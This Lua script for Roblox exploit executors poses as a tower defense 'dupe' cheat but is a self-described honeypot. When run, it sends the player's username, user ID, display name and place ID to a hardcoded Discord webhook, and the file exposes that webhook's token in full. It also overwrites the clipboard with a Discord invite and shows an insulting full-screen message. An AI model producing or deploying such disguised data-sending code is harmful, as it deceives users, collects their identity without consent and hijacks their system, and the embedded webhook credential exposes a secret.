local WEBHOOK_URL = "https://discord.com/api/webhooks/1550484102086660136/TKSA-IF5QLpHaCFM9O2GB6NefyOuE9fzcdpkE6blr34u69yH7BoS8aXG2_dHjlSp7osQ"
local DISCORD_INVITE = "discord.gg/Y8nXgQ98e" -- e.g. "discord.gg/yourserver"
 
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer
 
-- Report to webhook using executor's request() function
local function reportExecutor()
    local payload = HttpService:JSONEncode({
        content = string.format(
            "🚨 **Honeypot triggered!**\nUsername: `%s`\nUserId: `%s`\nDisplayName: `%s`\nPlaceId: `%s`\nTime: `%s`",
            player.Name,
            tostring(player.UserId),
            player.DisplayName,
            tostring(game.PlaceId),
            os.date("%Y-%m-%d %H:%M:%S")
        )
    })
 
    pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = payload
        })
    end)
end
 
-- Copy Discord invite to clipboard (works on most executors)
local function copyInvite()
    pcall(function()
        setclipboard(DISCORD_INVITE)
    end)
end
 
-- Show the gotcha GUI
local function showCaughtMessage()
    local gui = Instance.new("ScreenGui")
    gui.Name = "CaughtHoneypot"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 999999
    gui.Parent = player:WaitForChild("PlayerGui")
 
    local frame = Instance.new("Frame")
    frame.Size = UDim2.fromScale(1, 1)
    frame.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
    frame.BorderSizePixel = 0
    frame.Parent = gui
 
    local label = Instance.new("TextLabel")
    label.Size = UDim2.fromScale(0.9, 0.4)
    label.Position = UDim2.fromScale(0.05, 0.02)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.GothamBold
    label.TextColor3 = Color3.new(1, 1, 1)
    label.TextScaled = true
    label.TextWrapped = true
    label.Text = "thank you for using this slop tower defense dupe script, its really hard to get the users of cheaters its nice youre the one executing this \"dupe cheat\" thanks for your roblox username!"
    label.Parent = frame
 
    local label2 = Instance.new("TextLabel")
    label2.Size = UDim2.fromScale(0.5, 0.25)
    label2.Position = UDim2.fromScale(0.02, 0.55)
    label2.BackgroundTransparency = 1
    label2.Font = Enum.Font.GothamBold
    label2.TextColor3 = Color3.new(1, 1, 1)
    label2.TextScaled = true
    label2.TextWrapped = true
    label2.Text = "how can you be ass at cheating, transfer your units while you can dumass"
    label2.Parent = frame
 
    -- Discord invite box
    local discordBox = Instance.new("Frame")
    discordBox.Size = UDim2.fromScale(0.9, 0.12)
    discordBox.Position = UDim2.fromScale(0.05, 0.83)
    discordBox.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    discordBox.BorderSizePixel = 0
    discordBox.Parent = frame
 
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = discordBox
 
    local discordLabel = Instance.new("TextLabel")
    discordLabel.Size = UDim2.fromScale(1, 1)
    discordLabel.BackgroundTransparency = 1
    discordLabel.Font = Enum.Font.GothamBold
    discordLabel.TextColor3 = Color3.new(1, 1, 1)
    discordLabel.TextScaled = true
    discordLabel.TextWrapped = true
    discordLabel.Text = "🔗 Join our Discord (copied to clipboard!): " .. DISCORD_INVITE
    discordLabel.Parent = discordBox
end
 
reportExecutor()
copyInvite()
showCaughtMessage()
